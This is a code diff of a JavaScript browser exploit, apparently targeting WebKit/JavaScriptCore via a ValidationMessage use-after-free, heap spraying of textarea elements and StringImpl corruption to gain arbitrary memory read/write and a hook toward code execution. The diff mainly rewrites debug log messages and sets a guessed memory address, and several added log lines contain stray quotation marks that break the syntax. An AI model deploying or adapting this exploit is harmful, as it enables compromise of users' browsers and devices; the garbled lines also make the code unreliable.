@@ -44,7 +44,7 @@ var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
 var g_round = 1;
 var g_input = null;
 
-var guess_htmltextarea_addr = new Int64("APLICANDO WEBKIT");
+var guess_htmltextarea_addr = new Int64("0x2031b00d8");
 
 
 /* Executed after deleteBubbleTree */
@@ -53,14 +53,14 @@ function setupRW() {
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length > 0xff) {
 			g_relative_rw = g_arr_ab_3[i];
-			debug_log("APLICANDO WEBKIT");
+			debug_log("[+] Succesfully got a relative R/W");
 			break;
 		}
 	}
 	if (g_relative_rw === null)
 		die("[!] Failed to setup a relative R/W primitive");
 
-	debug_log("APLICANDO WEBKIT");
+	debug_log("[+] Setting up arbitrary R/W");
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
@@ -93,14 +93,14 @@ function setupRW() {
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
 
-	debug_log("APLICANDO WEBKIT");
+	debug_log("[+] Testing arbitrary R/W");
 
 	let saved_vtable = read64(guess_htmltextarea_addr);
 	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
 	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
 		die("[!] Failed to setup arbitrary R/W primitive");
 
-	debug_log("APLICANDO WEBKIT");
+	debug_log("[+] Succesfully got arbitrary R/W!");
 
 	/* Restore the overidden vtable pointer */
 	write64(guess_htmltextarea_addr, saved_vtable);
@@ -121,7 +121,7 @@ function setupRW() {
 	/* Getting code execution */
 	/* ... */
 	if(window.postExploit)
-		window.postExploit();    
+		window.postExploit();	   
 }
 
 function read(addr, length) {
@@ -197,7 +197,7 @@ function leakJSC() {
 	/* Looking for the smashed string */
 	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
-			debug_log("APLICANDO WEBKIT");
+			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
 			g_obj_str = null;
 			break;
@@ -206,7 +206,7 @@ function leakJSC() {
 	if (g_relative_read === null)
 		die("[!] Failed to setup a relative read primitive");
 
-	debug_log("APLICANDO WEBKIT");
+	debug_log("[+] Looking for the smashed StringImpl...");
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
@@ -283,7 +283,7 @@ function leakJSC() {
 	 * /!\ 
 	 */
 
-	debug_log("APLICANDO WEBKIT" + g_jsview_leak);
+	debug_log("[+] JSArrayBufferView: " + g_jsview_leak" + g_jsview_leak);
 
 	/* Run the exploit again */
 	prepareUAF();
@@ -357,15 +357,15 @@ function reuseTargetObj() {
 }
 
 function dumpTargetObj() {
-	debug_log("APLICANDO WEBKIT" + g_timer_leak);
-	debug_log("APLICANDO WEBKIT" + g_message_heading_leak);
-	debug_log("APLICANDO WEBKIT" + g_message_body_leak);
+	debug_log("[+] m_timer: " + g_timer_leak" + g_timer_leak);
+	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
+	debug_log("[+] m_messageBody: " + g_message_body_leak);
 }
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
-			debug_log("APLICANDO WEBKIT");
+			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
@@ -412,7 +412,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("APLICANDO WEBKIT");
+	debug_log("[+] Spraying HTMLTextareaElement ...");
 
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
